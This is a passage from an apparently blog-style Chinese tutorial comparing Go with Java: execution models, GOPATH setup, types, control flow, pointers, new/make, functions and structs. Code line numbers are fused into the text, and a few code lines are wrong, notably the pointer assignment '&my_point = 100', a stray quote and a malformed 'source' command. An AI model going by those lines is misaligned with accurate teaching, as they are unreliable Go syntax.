现在我们再来看编程语言，我们的程序执行有两种方式，一种是编译成操作系统可执行的二进制可执行程序，这样相当于编译一次，之后每次执行都不用再编译了，但是因为不同操作系统对于二进制文件的执行规范不同，不同的操作系统你要编译成不同的可执行文件。 解释型语言就是多了一个解释器，解释器我们可以类比为一个老师，你执行一行代码我们类比为学一句话的读音，解释器解释一句，就是老师先读一句，你跟着才能读一句，也就是解释器每解释一行代码为可运行的代码，操作系统执行一行代码，这样的话每次执行都需要解释器重新解释一遍，执行几次就得解释几次。 Go 是编译型的语言，运行在不同的平台需要打包成不同操作系统类型下的可执行文件。 Java 是半编译，半解释型语言。编译是指他的代码都会编译成 class 类型的文件，class 类型的文件只需要编译一次，可以在不同的操作系统的 Java 虚拟机上执行 ，半解释是指在 Java 虚拟机中，他还是需要一句一句的将 class 的二进制代码解释成对应操作系统可执行的代码。 # 4.Go 语言目前的主要应用场景 12345678910*.和Java一样，Go语言最多的应用场景就是服务器后端系统的开发，包括Web后端，微服务后端接口。*.Go非常适用需要高性能高并发的网络编程，这里的网络编程是指不需要界面，底层只是用Socket相互传输数据的系统，类似于Java中Netty的用途。*.一些云计算容器，比如Docker，K8s，底层就是Go语言开发的，也可以用做底层自研运维项目的开发。*.一些游戏系统的开发，可以用Go语言。*.区块链的一些底层软件和一些应用软件。(区块链程序的第一开发语言) # 5. 现在市场上都有哪些公司在使用 Go 语言？ 我们不讲虚的，直接 BOSS 直聘看哪些公司招，招的是干什么系统开发的。 这是腾讯的一个岗位。 看看岗位描述，是做互联网保险 产品的业务系统开发，业务系统是啥意思，和 JAVA 后端业务系统一样啊，说明腾讯的一部分项目已经用 Go 来开发业务系统了， 至少他这个保险团队是这样的。 再看小米也是： 也是后端，这是要和 JAVA 抢饭碗。。。 再看一个常见的，Go 非常适合开发运维管理系统，这个估计是开发维护阿里内部的自动化运维项目的，也就是说他们的运维支持可能是他们自己用 Go 语言写的项目。(实在不理解你就想下他们自己自研开发了一个类似于 Jenkins 和 Docker 之类的环境和代码流程发布的项目) 再来看一个字节跳动的，也是开发内部流程自动部署自动运维程序的 再看华为的，好像 Java 架构师的要求啊，微服务，缓存，消息中间件，数据库。。。 这里不多看，自己看看去吧，大多数你能知道的大公司都有用 go 语言尝试的新部门，新项目，市场占有率虽然比 Java 少，但是岗位实际上蛮多的。自己可以去 BOSS 上详细查查。 # 三.Go 和 Java 微观对比 # 1.GoPath 和 Java 的 ClassPath 我们先来看看关于 Java 的 classpath： 在我们的开发环境中，一个 web 程序 (war 包) 有一个 classpath, 这个 classpath 在 IDEA 的开发工具中目录体现为 src 目录和 resource 目录，实际上在真正的 war 包中他定位的是指 WEB-INF 下的 classes 文件夹下的资源 (比如 class 文件)。 我们编译后的文件都放在 classpath (类路径) 下。我们多个项目程序会有多个 classpath 目录。 在 Go 语言中，GoPath 在同一系统上的同一用户，一般规定只有一个，无论这个用户创建多少个 go 项目，都只有一个 GoPath, 并且这些项目都放在 GoPath 下的 src 目录下。 GoPath 下有三个目录： 1.bin （用于存放项目编译后的可执行文件） 2.pkg (用于存放类库文件，比如.a 结尾的包模块) 3.src （用于存放项目代码源文件） 注意：当我们在 windows 上开发 Go 程序时，需要新建一个文件夹 (文件夹名任意) 作为 GOPATH 的文件目录，在其中新建三个文件夹分别是：bin,pkg,src。如果是在集成开发工具上开发的话，需要在设置中把 GOPATH 路径设置为你自定义的那个文件夹，之后产生的文件和相关内容都会在其中。 如果是在 linux 上想跑测试开发执行 go 程序，需要在 /etc/profile 添加名为 GOPATH 的环境变量，目录设置好自己新建的。 例如：全局用户设置 GOPATH 环境变量 12345vi /etc/profile#添加如下 目录可以灵活修改export GOPATH=/pub/go/gopath//立即刷新环境变量生效source /etc/profile 单用户设置 GOPATH 环境变量 123456vi ~/.bash_profile#添加如下 目录可以自己灵活修改export GOPATH=/home/user/local/soft/go/gopath//立即刷新环境变量生效source vi ~/.bash_profile 注意：这是在 linux 上开发 go 程序才需要的，如果只是生产运行程序的话是不需要任何东西的，直接运行二进制可执行程序包即可，他所有的依赖全部打进包中了。 如果是在 windows 下的 cmd，dos 窗口运行相关的 go 命令和程序，则需要在 windows 的【此电脑】–&gt;【右键】–&gt;【属性】–&gt;【高级系统设置】–&gt;【环境变量】-【新建一个系统变量】–&gt;【变量名为 GOPATH，路径为你自己指定的自定义文件夹】（如果是在 IDEA 中开发，不需要在此配置环境变量，只需要在 IDEA 中配置好 GOPATH 的目录设置即可） # 2.Go 的开发环境搭建 （配置环境变量 GOPATH 参考上一节内容） 我们要开发 Go 的程序，需要如下两样东西： 1.Go SDK GO 中文社区 SDK 下载地址：https://studygolang.com/dl go1.14 (最新的) 我们用 1.14 版就可以，因为 1.13 后才完全支持 Module 功能。 有两种安装模式，一种是压缩包解压的方式，一种是图形化安装。 推荐使用 windows 图形安装傻瓜式安装，windows 图形安装下载这个 https://studygolang.com/dl/golang/go1.14.6.windows-amd64.msi Go 的集成软件开发环境 参考三 (4) 中的 go 集成开发环境选择。 # 3.Go 与 Java 的文件结构对比 # 1).go 文件结构模板 1234567891011121314151617181920212223242526//主程序必须是写成main包名package main//导入别的类库import &quot;fmt&quot; //全局常量定义const num = 10 //全局变量定义var name string = &quot;li_ming&quot;//类型定义type P struct {} //初始化函数func init() {}//main函数:程序入口func main() { fmt.Printf(&quot;Hello World!!!&quot;);} # 2).Java 文件结构 123456789101112131415161718192021222324//包名package my_package; //导入包中的类import java.io.*；public Class MainTest{ //main方法:程序入口 public void static main(String[] args) { }}//people类Class People { //成员变量 public String name; public int age; //成员方法 public void doSomething() { } } # 4.Go 与 Java 的集成开发环境 # 1).Go 的集成开发环境 1234567最常用的有三种：Visual Studio Code(VS Code) 微软开发的一款Go语言开发工具。LiteIDE 是国人开发的Go语言开发工具。GoLand 这个非常好用，和Java中的IDEA是一家公司。(推荐使用) # 2).Java 的集成开发环境 123MyEclipse,Eclipse(已过时)。IntelliJ IDEA(大多数用这个)。 # 5.Go 和 Java 常用包的对比 123456789101112Go中文API文档地址：https://studygolang.com/pkgdoc12 Go Java IO流操作： bufio/os java.lang.io字符串操作： strings java.lang.String容器 container(heap/list/ring) java.lang.Collection锁 sync juc时间 time java.time/java.lang.Date算数操作 math java.math底层Unsafe unsafe unsafe类 # 6.Go 的常用基础数据类型和 Java 的基础数据类型对比 # 1).go 中的常用基础数据类型有： 123456789101112131415161718192021221.布尔型：关键字【bool】： true false2.有符号整形：头一位是代表正负 int 默认整形 4或8字节 32位或64位 int8 1字节 8位 int16 2字节 16位 int32 4字节 32位 in64 8字节 64位 【int是32还是64位取决于操作系统的位数，现在电脑一般都是64位的了，所以一般都是64位】3.无符号整形 uint 4或8字节 32位或64位 uint8 1字节 8位 uint16 2字节 16位 uint32 4字节 32位 uint64 8字节 64位4.浮点型 注：go语言没有float类型，只有float32和float64。 float32 32位浮点数 float64 64位浮点数5.字符串 string6. byte 等同uint8，只是类似于一个别名的东西 rune 等同int32 只是一个别名，强调表示编码概念对应的数字 # 2).go 中派生数据类型有： 12345678910注:这里简单列举一下指针 Pointer数组 Array[]结构体 struct进程管道： channel 函数 func切片 slice接口 interface哈希 map123456789 # 3).Java 中的基础数据类型 123456789101112131415byteshortintlongfloatdoublebooleanchar # 7.Go 和 Java 的变量对比 # 1).go 的变量 1234567891011121314package mainimport( //包含print函数 &quot;fmt&quot;)func main() { //var 变量名 变量类型 = 变量值 var name string = &quot;li_ming&quot; //方法内部可以直接使用 【 变量名 := 变量值 】 赋值，方法外不可以 name2:=&quot;xiao_hong&quot; fmt.Println(&quot;name = &quot;,name) fmt.Println(&quot;name2 = &quot;,name2)} # 2).Java 的变量 123456789public class MyTest { public static void main(String[] args) { //变量类型 变量名 = 变量值 String name = &quot;li_ming&quot;; int i = 10; System.out.println(&quot;name =&quot;+name); System.out.println(&quot;i =&quot;+i); }} # 8.Go 和 Java 的常量对比 # 1).go 的常量 1234567891011121314151617181920go中的常量和java中的常量含义有一个本质的区别：go中的常量是指在编译期间就能确定的量(数据)，而java中的常量是指被赋值一次后就不能修改的量(数据)。所以两者不一样，因为Java中的常量也是JVM跑起来后赋值的，只不过不允许更改；go的常量在编译后就确实是什么数值了。12345package mainimport( //包含print函数 &quot;fmt&quot;)func main() { //const 常量名 常量类型 = 常量值 显示推断类型 const name string = &quot;const_li_ming&quot; //隐式推断类型 const name2 =&quot;const_xiao_hong&quot; fmt.Println(&quot;name = &quot;,name) fmt.Println(&quot;name2 = &quot;,name2)} # 2).Java 的常量 1234567public class MyTest { //【访问修饰符】 【静态修饰符】final修饰符 常量类型 常量名 = 常量值； public static final String TAG = &quot;A&quot;; //一般设置为static静态 public static void main(String[] args) { System.out.println(&quot;tag= &quot;+TAG); }} # 9.Go 与 Java 的赋值对比 # 1).go 的赋值 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051Go方法内的赋值符号可以用 := ,也可以用 =,方法外只能用 = 。例如:12package mainimport( //包含print函数 &quot;fmt&quot;)//方法外只能用 = 赋值var my_name string = &quot;my_name&quot;var my_name2 = &quot;my_name2&quot;//my_name3:=&quot;my_name3&quot; 不在方法内，错误func main() { fmt.Println(&quot;name = &quot;,my_name) fmt.Println(&quot;name2 = &quot;,my_name2)}12345678910111213141516Go支持多变量同时赋值：1package mainimport( //包含print函数 &quot;fmt&quot;)func main() { //多变量同时赋值 var name,name2 = &quot;li_ming&quot;,&quot;xiao_hong&quot; fmt.Println(&quot;name = &quot;,name) fmt.Println(&quot;name2 = &quot;,name2)}12345678910111213Go的丢弃赋值1package mainimport( //包含print函数 &quot;fmt&quot;)func main() { //丢弃赋值 把 1和2丢弃 只取3 //在必须一次取两个以上的值的场景下，又不想要其中一个值的时候使用，比如从map中取key,value var _,_,num = 1,2,3 fmt.Println(&quot;num = &quot;,num)} # 2).java 的赋值 123456789public class MyTest { public static void main(String[] args) { //直接用 = 赋值 String name = &quot;li_ming&quot;; int i = 10; System.out.println(&quot;name =&quot;+name); System.out.println(&quot;i =&quot;+i); }} # 10.Go 与 Java 的注释 123456789Go中的注释写法和Java中的基本一样。例如：//单行注释,两者相同/* Go的多行注释*//** Java多行注释*/ # 11.Go 和 Java 的访问权限设置区别 首先我们来回忆一下，Java 的权限访问修饰符有哪些？ public 全局可见 protected 继承相关的类可见 default 同包可见 private 私有的，本类可见 关于 Java 中的访问权限修饰符，是用于修饰变量，方法，类的，被修饰的对象被不同的访问权限修饰符修饰后，其它程序代码要想访问它，必须在规定的访问范围内才可以，比如同包，同类，父子类，全局均可访问。 那么，Go 中的访问权限设置又有什么区别呢？ 要理解这个问题，首先我们要来看一下一个 Go 程序的程序文件组织结构是什么样子的？ 一个可运行的编译后的 Go 程序，必须有一个入口，程序从入口开始执行，这个入口必须是 main 包，并且从 main 包的 main 函数开始执行。 但是，为了开发的效率和管理开发任务的协调简单化，对于代码质量的可复用，可扩展等特性的要求，我们一般采用面向对象的，文件分模块式的开发。 比如，我是一个游戏程序，我的 main 函数启动后，首先要启动 UI 界面，那么关于 UI 界面相关的代码我们一般会专门分出一个模块去开发，然后这个模块有很多个程序文件，这里关于 UI 模块比如有 3 个文件，a.go,b.go,c.go，那么我们在实际当中会建一个以 ui 为名的包文件夹，然后把 a.go,b.go,c.go 全部放到 ui 这个包文件夹下，然后因为这个包没有 main 包，没有 main 函数，所以它打出来的一个程序文件就是以.a 结尾的工具包，类似于 Java 中的 jar 包，工具包文件名为 ui.a。 参考如下： ----com.add.mygame.ui ------------------------------------a.go ------------------------------------b.go ------------------------------------c.go a.go 文件如下示例： 123456789101112//这里的ui，也就是package后面的名称尽量和包文件夹的名称一致，不一致也可以package ui//相关方法和业务func main() { }//启动游戏UIfunc StartGameUI() {} 这里需要注意一个点，在程序中的 package 后面的 ui 包名可以和文件夹 com.mashibing.mygame.ui 中最后一层的 ui 文件夹名称不一致， 我们一般按规范写是要求写一致的，不一致时的区别如下： 我们把 ui.a 打包完毕后，我们就可以在别的程序中用 import 导入这个包模块 ，然后使用其中的内容了。 上面两个 ui 不同之处在于，在我们 import 的代码后面，需要写的模块名称是在 ${gopath}/src/ 下的文件夹名，也就是 com.mashibing.mygame.ui 中的 ui。 例如： 123456789101112//游戏主程序package main//这里的ui是com.mashibing.mygame.ui的最后一层文件夹名import &quot;ui&quot;//相关方法和业务func main() { //这里的ui不是文件夹名，而是之前a.go程序中package后面写的包名 ui.StartGameUI()} 接下来进入主题，我们的 go 语言关于访问修饰符的是指的限制什么权限，以及如何实现？ 我们之前可以看出来，实战中的 go 程序是有一个 main 程序 import 很多其它包模块，每个模块实现对应的功能，最后统一在 main 程序中组合来完成整个软件程序，那么有一些其它模块的函数和变量，我只想在本程序文件中调用，不想被其它程序 import 能调用到，如何实现？ import 后是否能调用对应包中的对象 (变量，结构体，函数之类的) 就是 go 关于访问权限的定义，import 后，可以访问，说明是开启了访问权限，不可以访问，是说明关闭了其它程序访问的权限。 在 go 中，为了遵循实现简洁，快速的原则，用默认的规范来规定访问权限设置。 默认规范是：某种类型（包括变量，结构体，函数，类型等）的名称定义首字母大写就是在其它包可以访问，首字母非大写，就是只能在自己的程序中访问。 这样我们就能理解为什么导入 fmt 包后，他的 PrintF 函数的首字母 P 是大写的。 参照如下代码： 123456789101112131415package uiimport &quot;fmt&quot;func main() { //这里的P是大写 //所有调用别的包下的函数，都是首字母大写 fmt.Printf(&quot;aa&quot;)}//这里的Person的首字母P也是表示外部程序导入该包后可以使用此Person类type Person struct{}//这里的D同上var Data string = &quot;li_ming&quot; # 12.Go 与 Java 程序文件的后缀名对比 1234567891011Java的编译文件是.class结尾,多个.class打成的一个可执行文件是.jar结尾,.jar不能直接在windows和linux上执行,得用java命令在JVM中执行。Go语言的程序文件后缀为.go,有main包main函数的,.go文件打包成二进制对应操作系统的可执行程序,如windows上的.exe结尾的可执行程序。Java的类库会以.jar结尾，Go语言非main包没有main函数的程序编译打包会打成一个类库，以.a结尾,也就是说Go语言的类库以.a结尾。Go的类库如下: 包名.a my_util.a注：my_util是最顶层文件夹名，里面包含着一个个程序文件。12345678910 # 13.Go 与 Java 选择结构的对比 # 1).if 1Go中的if和Java中的if使用相同，只不过是把小括号给去掉了。 示例 1： 12345678910111213141516171819202122package mainimport ( &quot;fmt&quot;)func main() { /* 单分支结构语法格式如下: if 条件判断 { //代码块 } */ var num int fmt.Printf(&quot;请输入数字&quot;) fmt.Scan(&amp;num) if num &gt; 10 { fmt.Println(&quot;您输入的数字大于10&quot;) }} 示例 2： 1234567891011121314151617181920212223242526package mainimport ( &quot;fmt&quot;)func main() { /* if else分支结构语法格式如下: if 条件判断 { //代码块 } else { //代码快2 } */ var num int fmt.Printf(&quot;请输入数字&quot;) fmt.Scan(&amp;num) if num &gt; 10 { fmt.Println(&quot;您输入的数字大于10&quot;) } else { fmt.Println(&quot;您输入的数字不大于10&quot;) }} 示例 3： 123456789101112131415161718192021222324252627282930package mainimport ( &quot;fmt&quot;)func main() { /* if else分支结构语法格式如下: if 条件判断 { //代码块 } else if 条件判断{ //代码块2 } else { //代码块3 } */ var num int fmt.Printf(&quot;请输入数字&quot;) fmt.Scan(&amp;num) if num &gt; 10 { fmt.Println(&quot;您输入的数字大于10&quot;) } else if num == 10{ fmt.Println(&quot;您输入的数字等于10&quot;) } else { fmt.Println(&quot;您输入的数字小于10&quot;) }} # 2).switch 示例 1： 12345678910111213141516package mainimport ( &quot;fmt&quot;)func main() { var a = &quot;li_ming&quot; switch a { case &quot;li_ming&quot;: fmt.Println(&quot;Hello!LiMing&quot;) case &quot;xiao_hong&quot;: fmt.Println(&quot;Hello!XiaoHong&quot;) default: fmt.Println(&quot;No!&quot;) }} 示例 2：一分支多值 1234567891011121314151617181920package mainimport ( &quot;fmt&quot;)func main() { var name = &quot;li_ming&quot; var name2 = &quot;xiao_hong&quot; switch name { //li_ming或xiao_hong 均进入此 case &quot;li_ming&quot;, &quot;xiao_hong&quot;: fmt.Println(&quot;li_ming and xiao_hong&quot;) } switch name2 { case &quot;li_ming&quot;, &quot;xiao_hong&quot;: fmt.Println(&quot;li_ming and xiao_hong&quot;) }}g 示例 3：switch 表达式 123456789101112package mainimport ( &quot;fmt&quot;)func main() { var num int = 11 switch{ case num &gt; 10 &amp;&amp; num &lt; 20: fmt.Println(num) }} 示例 4：fallthrough 下面的 case 全部执行 123456789101112131415package mainimport ( &quot;fmt&quot;)func main() { var num = 11 switch { case num == 11: fmt.Println(&quot;==11&quot;) fallthrough case num &lt; 10: fmt.Println(&quot;&lt;12&quot;) }} # 14.Go 与 Java 循环结构的对比 # 1).for 循环 示例 1：省略小括号 1234567891011package mainimport (&quot;fmt&quot;)func main() { for i := 1; i &lt; 10; i++ { fmt.Println(i) }} 示例 2：和 while 相同，break,continue 同 java 123456789101112131415161718package mainimport ( &quot;fmt&quot;)func main() { i := 0 //省略另外两项，相当于java中的while for i &lt; 3 { i++ } //break用法相同 for i == 3 { fmt.Println(i) break }} 示例 3：死循环，三项均省略 123456789101112package mainfunc main() { for { } for true { }} 示例 4：嵌套循环和 java 也一样，不演示了 示例 5： range 循环 12345678910package mainimport &quot;fmt&quot;func main() { var data [10]int = [10]int{1,2,3,4,5,6,7,8,9,10} for i, num := range data { fmt.Println(i,num) }} # 2).goto 1234567891011121314151617package mainimport &quot;fmt&quot;func main() { //goto可以用在任何地方，但是不能跨函数使用 fmt.Println(&quot;start&quot;) //go to的作用是跳转，中间的语句不执行，无条件跳转 goto my_location //goto是关键字， my_location可以自定义，他叫标签 fmt.Println(&quot;over&quot;) my_location: fmt.Println(&quot;location&quot;) # 15.Go 与 Java 的数组对比 1）go 的一维数组 1var 数组名 [数组长度]数组类型 = [数组长度]数组类型{元素1，元素2...} 示例 1： 12345678910111213package mainimport &quot;fmt&quot;//全局var my_arr [6]intvar my_arr_1 [3]int = [3]int{1,2,3}func main() { //方法内： this_arr := [2]int{1, 2} fmt.Println(my_arr) fmt.Println(my_arr_1) fmt.Println(this_arr)} 2）二维数组 12345678910111213141516package mainimport &quot;fmt&quot;//全局var my_arr [4][6]intvar my_arr_1 [2][3]int = [...][3]int{{1, 2, 3}, {4, 5, 6}}func main() { //方法内： this_arr := [2][3]int{{1, 2, 3}, {8, 8, 8}} // 第 2 纬度不能用 &quot;...&quot;。 this_arr2 := [...][2]int{{1, 1}, {2, 2}, {3, 3}} fmt.Println(my_arr) fmt.Println(my_arr_1) fmt.Println(this_arr) fmt.Println(this_arr2)} # 16.Go 有指针概念，Java 没有指针概念 123456789101112Go中有指针的概念，Java中没有指针的概念。指针简单的说就是存储一个【变量地址】的【变量】。12Go中使用指针的方法//*+变量类型 = 对应变量类型的指针类型，&amp;+变量名 = 获取变量引用地址 var 指针变量名 *指针变量类型 = &amp;变量名 例如：var my_point *int = &amp;num//通过&amp;+指针变量 = 修改原来的变量真实值&amp;指针变量名 = 修改的变量值例如：&amp;my_point = 100; 示例： 123456789101112131415161718192021package mainimport &quot;fmt&quot;func main() { // 声明实际变量 var name string=&quot;li_ming&quot; // 声明指针变量 var name_point *string // 指针变量的存储地址 name_point = &amp;name //直接访问变量地址 fmt.Println(&quot;name 变量的地址是:&quot;, &amp;name ) // 指针变量的存储地址 fmt.Println(&quot;name_point变量储存的指针地址:&quot;, name_point ) // 使用指针访问值 fmt.Println(&quot;*name_point 变量的值:&quot;, *name_point )} 输出结果： 123name 变量的地址是: 0x10ae40f0name_point变量储存的指针地址: 0x10ae40f0*name_point 变量的值: li_ming # 17.Go 语言的中 new,make 和 Java 中的 new 对象有什么区别？ 首先，Java 中的 new 关键字代表创建关于某一个类的一个新的对象。 如： 1List list = new ArrayList(); Go 中的创建一个 struct 结构体的对象，是不需要用 new 关键字的，参考【20】中有代码示例讲解如何创建结构体对象。 Go 中 new 的概念是和内存相关的，我们可以通过 new 来为基础数据类型申请一块内存地址空间，然后把这个把这个内存地址空间赋值给 一个指针变量上。（new 主要就是为基础数据类型申请内存空间的，当我们需要一个基础数据类型的指针变量，并且在初始化这个基础指针变量时，不能确定他的初始值，此时我们才需要用 new 去内存中申请一块空间，并把这空间绑定到对应的指针上，之后可以用该指针为这块内存空间写值。new 关键字在实际开发中很少使用，和 java 很多处用 new 的情况大不相同） 参考如下示例代码： 123456789101112package mainimport &quot;fmt&quot;func main() { var num *int //此处num是nil fmt.Println(num) //此处会报空指针异常，因为num为nil,没有申请内存空间，所以不能为nil赋值 *num = 1 fmt.Println(*num)} 改为如下代码即可： 12345678910111213package mainimport &quot;fmt&quot;func main() { //在内存中申请一块地址，并把内存地址存入num var num = new(int) //此处num的值是申请出来的内存空间地址值，一个十六进制的数字 fmt.Println(num) //正常 *num = 1 fmt.Println(*num)} 接下来我们来看一个 go 中的 make 是做什么用的？ go 中的 make 是用来创建 slice (切片)，map (映射表)，chan (线程通信管道) 这三个类型的对象的，返回的就是对应类型的对象，他的作用就相当于 Java 中 new 一个 ArrayList，new 一个 HashMap 时候的 new 的作用，只不过是 go 语法规定用 make 来创建 slice (切片)，map (映射表)，chan (线程通信管道)。 示例代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253package mainimport &quot;fmt&quot;func main() { //make只能为map,channel,slice申请分配内存，只有这三种，没有第四种 //所有通过make创建的这三种类型都是引用类型，传递参数时虽然是引用值传递， //但是对方法内引用变量参数的修改可以影响到外部的引用变量 //1.通过make创建map对象 如下代码类似于Java中 Map&lt;String,Integer&gt; myMap = new HashMap&lt;&gt;(); //在这里make就是申请分配map的内存，和java中创建map的new一样 myMap := make(map[string]int) myMap[&quot;li_ming&quot;] = 20 //2.通过make创建channel,make函数内可以有一个参数，也可以有两个参数，有两个参数时第二个参数 //为通道的缓存队列的长度 //2.1) 只有一个参数，通道的缓存队列长度此时为0，也就是无缓存。 //创建一个传输int类型数据的通道 myChan := make(chan int) fmt.Println(myChan) //2.2) 有两个参数，第二个参数2代表此时代表缓存队列的长度为2 //创建一个传输int类型数据的通道,缓存为2 mychan2 := make(chan int,2) fmt.Println(mychan2) //此处暂时不做通道缓存队列数多少有何区别的讲解 //3.通过make创建slice切片 //有两种方式，一种是两个参数，一种是三个参数 //我们只有在创建一个空的切片时才会使用make //如果通过一个已有的数组创建切片往往是下面的形式 //创建一个底层数组 myArr := []int{1,2,3,4,5} //如果通过一个数组创建切片，往往是用 原始数组变量名[切片起始位置:切片结束位置] 创建一个切片 mySlice1 := myArr[2:4] fmt.Println(mySlice1) //我们如果是想创建一个空的slice,则用make创建切片 //如下形式 make(int[],num1,num2) //num1 = 切片的长度(默认分配内存空间的元素个数) //num2 = 切片的容量(解释：底层数组的长度/切片的容量，超过底层数组长度append新元素时会创建一个新的底层数组， //不超过则会使用原来的底层数组) //代表底层数组的长度是4,默认给底层数组的前两个元素分配内存空间 //切片指向前两个元素的地址，如果append新元素，在元素数小于4时都会 //在原来的底层数组的最后一个元素新分配空间和赋值， //append超过4个元素时，因为原数组大小不可变，也也存储不下了， //所以会新创建一个新的底层数组，切片指向新的底层数组 mySliceEmpty := make([]int,2,4) fmt.Println(mySliceEmpty) //两个参数，代表切片的长度和切片的容量(底层数组长度)均为第二个参数那个值 mySliceEmpty2 := make([]int,5) fmt.Println(mySliceEmpty2)} # 18.Go 相关的数据容器和 Java 的集合框架对比 12345678Go中有的数据结构：数组，切片，map，双向链表，环形链表，堆Go自己的类库中没有set,没有集合(List)，但是第三方库有实现。Java中有： Map,Set,List,Queue,Stack,数组Java中没有切片的概念。Go中的数组打印格式是[1,2,3,4,5] Go中的切片打印格式是[[1,2,3]]Go中切片的概念：切片是数组的一个子集，就是数组截取某一段。Go的map和Java的map大致相同 # 19.Go 中的函数，Go 的方法和 Java 中的方法对比 # 1).Go 中的函数定义 1234Go中返回值可以有多个，不像Java中多个值得封装到实体或map返回//注：【】内的返回值可不写，无返回值直接把返回值部分全部去掉即可。func 函数名(变量1 变量类型，变量2 变量2类型...)【(返回值1 类型1，返回值2 类型2...)】 { //注意：这个方法的右中括号必须和func写在同一行才行，否则报错，不能按c语言中的换行写123 示例 1： 12345678910111213141516171819202122232425262728package mainimport &quot;fmt&quot;func main() { //定义局部变量 var a int = 100 var b int = 200 var result int //调用函数并返回最大值 result = max(a, b) fmt.Println( &quot;最大值是 :&quot;, result )}/* 函数返回两个数的最大值 */func max(num1, num2 int) int { /* 定义局部变量 */ var result int if (num1 &gt; num2) { result = num1 } else { result = num2 } return result} 示例 2：返回多个值 12345678910111213package mainimport &quot;fmt&quot;func main() { a, b := swap(&quot;li_ming&quot;, &quot;xiao_hong&quot;) fmt.Println(a, b)}func swap(x, y string) (string, string) { //返回多个值 return y, x} 注意点：函数的参数：基础类型是按值传递，复杂类型是按引用传递 示例 3： 函数的参数：变长参数传递 123456789101112131415161718package mainimport &quot;fmt&quot;func main() { manyArgs(1,2,&quot;2&quot;,&quot;3&quot;,&quot;4&quot;) manyArgs(1,2,&quot;5&quot;,&quot;5&quot;,&quot;5&quot;) dataStr := []string{&quot;11&quot;,&quot;11&quot;,&quot;11&quot;} //传数组也可以，加三个点 manyArgs(1,2,dataStr...)}//可变参数必须放在最后面func manyArgs(a int,b int ,str ...string ){ for i,s := range str { fmt.Println(i,s) }} 注意点：函数的返回值：如果有返回值，返回值的类型必须写，返回值得变量名根据情况可写可不写。 示例 4： defer：推迟执行 (类似于 java 中的 finally) 1234567891011121314151617181920212223package mainimport &quot;fmt&quot;func main() { testMyFunc();}func testDefer1() { fmt.Println(&quot;print defer1&quot;)}func testDefer2() { fmt.Println(&quot;print defer2&quot;)}func testMyFunc() { //defer会在方法返回前执行，有点像java中的finally //defer写在任意位置均可，多个defer的话按照逆序依次执行 defer testDefer2() defer testDefer1() fmt.Println(&quot;print my func&quot;)} 示例 5 ：丢弃返回值 12345678910111213141516171819202122package mainimport &quot;fmt&quot;func main() { //方式一丢弃：丢弃num1和str _,num2,_:= testFun(1,2,&quot;3&quot;); fmt.Println(num2) //方式二丢弃： _,num3,_:= testFun(1,3,&quot;4&quot;); fmt.Println(num3)}func testFun(num1,num2 int,str string) (n1 int,n2 int,s1 string){ n1 = num1 n2 = num2 s1 = str return}func testFun2(num1,num2 int,str string) (int,int,string){ return num1,num2,str} # 2).Java 中的方法定义 1234访问修饰符 返回值类型 方法名(参数1类型 参数1，参数2类型 参数2...) { return 返回值;} 示例： 1234public Integer doSomething(String name,Integer age) { return 20;} # 20.Go 的内置函数和 Java 的默认导入包 java.lang.* 为了在 Java 中快速开发，Java 语言的创造者把一些常用的类和接口都放到到 java.lang 包下，lang 包下的特点就是不用写 import 语句导入包就可以用里面的程序代码。 Go 中也有类似的功能，叫做 Go 的内置函数，Go 的内置函数是指不用导入任何包，直接就可以通过函数名进行调用的函数。 Go 中的内置函数有： 1234567891011close 关闭channellen 求长度make 创建slice,map,chan对象append 追加元素到切片(slice)中 panic 抛出异常，终止程序recover 尝试恢复异常，必须写在defer相关的代码块中 参考示例代码 1： 1234567891011121314151617181920212223242526272829303132333435363738package mainimport &quot;fmt&quot;func main() { array := [5]int{1,2,3,4,5} str := &quot;myName&quot; //获取字符串长度 fmt.Println(len(str)) //获取数组长度 fmt.Println(len(array)) //获取切片长度 fmt.Println(len(array[1:])) //make创建channel示例 intChan := make(chan int,1) //make创建map示例 myMap := make(map[string]interface{}) //make创建切片 mySlice := make([]int,5,10) fmt.Println(intChan) fmt.Println(myMap) fmt.Println(mySlice) //关闭管道 close(intChan) //为切片添加元素 array2 := append(array[:],6) //输出 fmt.Println(array2) //new案例 num := new(int) fmt.Println(num)} 参考示例代码 2：panic 和 recover 的使用 他们用于抛出异常和尝试捕获恢复异常 123456789101112131415161718192021222324func func1() { fmt.Println(&quot;1&quot;)}func func2() { // 刚刚打开某资源 defer func() { err := recover() fmt.Println(err) fmt.Println(&quot;释放资源..&quot;) }() panic(&quot;抛出异常&quot;) fmt.Println(2&quot;)}func func3() { fmt.Println(&quot;3&quot;)}func main() { func1() func2() func3()} Java 中的 java.lang 包下具体有什么在这里就不赘述了，请参考 JavaAPI 文档： 1JavaAPI文档导航：https://www.oracle.com/cn/java/technologies/java-se-api-doc.html # 21.Go 的标准格式化输出库 fmt 和 java 的输出打印库对比 Java 的标准输出流工具类是 java.lang 包下的 System 类，具体是其静态成员变量 PrintStream 类。 他有静态三个成员变量: 分别是 PrintStream 类型的 out,in,err 我们常见 System.out.println (), 实际上调用的就是 PrintStream 类对象的 println 方法。 Go 中的格式化输出输入库是 fmt 模块。 fmt 在 Go 中提供了输入和输出的功能，类型 Java 中的 Scanner 和 PrintStream (println)。 它的使用方法如下： 12345Print: 原样输出到控制台，不做格式控制。Println: 输出到控制台并换行Printf : 格式化输出(按特定标识符指定格式替换)Sprintf：格式化字符串并把字符串返回，不输出，有点类似于Java中的拼接字符串然后返回。Fprintf：来格式化并输出到 io.Writers 而不是 os.Stdout 详细占位符号如下： 代码示例如下： # 22.Go 的面向对象相关知识 # 1. 封装属性 (结构体) Go 中有一个数据类型是 Struct, 它在面向对象的概念中相当于 Java 的类，可以封装属性和封装方法，首先看封装属性如下示例： 123456789101112131415161718192021222324252627282930313233package mainimport &quot;fmt&quot;//示例type People struct { name string age int sex bool}func main(){ //示例1： var l1 People l1.name = &quot;li_ming&quot; l1.age = 22 l1.sex = false //li_ming fmt.Println(l1.name) //示例2 var l2 *People = new(People) l2.name = &quot;xiao_hong&quot; l2.age = 33 l2.sex = true //xiao_hong xiao_hong fmt.Println(l2.name,(*l2).name) //示例3: var l3 *People = &amp;People{ name:&quot;li_Ming&quot;,age:25,sex:true} //li_Ming li_Ming fmt.Println(l3.name,(*l3).name)} # 2. 封装方法 (方法接收器) 如果想为某个 Struct 类型添加一个方法，参考如下说明和代码： go 的方法和 Java 中的方法对比，go 的函数和 go 方法的不同 Go 中的函数是不需要用结构体的对象来调用的，可以直接调用 Go 